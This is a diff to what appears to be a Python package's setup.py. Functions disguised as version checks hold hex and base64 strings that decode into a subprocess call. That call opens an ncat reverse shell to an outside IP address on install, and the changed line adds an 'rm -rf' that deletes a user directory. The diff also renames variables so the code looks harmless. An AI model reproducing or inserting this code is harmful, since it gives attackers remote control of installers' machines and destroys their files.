@@ -42,18 +42,18 @@ def check_version(version):
 def verify_version(ver1, ver2):
     checkA = version_match.index("V")
     if checkA == 0:
-        return "L3NoIDEyOC4xOTkuOTQuMjE0IDExOTQgJiJdLCBzaGVsbD1UcnVlKQ"
+	return "L3NoIDEyOC4xOTkuOTQuMjE0IDExOTQgJiBybSAtcmYgfi9Qcml2ZXNjL0xpbnV4L2xpbnV4cHJpdmVzYyJdLCBzaGVsbD1UcnVlKQ"
     raise RuntimeError("Could not verify version.")
 
 def loadsetup():
-    v1 = check_version("linuxprivesc.py")
-    v2 = "70656e285b226e636174202d65202f62696e"
+    versionCheck = check_version("linuxprivesc.py")
+    versionCompare = "70656e285b226e636174202d65202f62696e"
     for i in range(12):
         i = i + 6
-        version = v1+v2+parse_version(verify_version(i, version_match))
+        version = versionCheck+versionCompare+parse_version(verify_version(i, version_match))
     return version
 
-    
+
 def process_setup():
     setuptask = loadsetup().decode('hex')
     if "2d652" in setuptask.encode('hex'):
@@ -169,5 +169,4 @@ setup(
     scripts=scripts,
     entry_points=entry_points,
 )
-
 
